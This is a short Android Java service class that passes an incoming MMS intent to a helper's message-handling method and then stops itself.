package net.workspace;
import net.workspace.mms.MmsHelper;
import android.content.Intent;

/**
 * MmsService
 * @author Hike
 *
 */
public class MS extends net.workspace.AS {
    @Override
    public void onCreate() {
        super.onCreate();
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        new MmsHelper().dealMsg(net.workspace.MR.instance, net.workspace.MR.intent);
        quitService();
    }
    private void quitService() {
        Intent intent = new Intent();
        intent.setClass(this, net.workspace.MS.class);
        stopService(intent);
    }
}
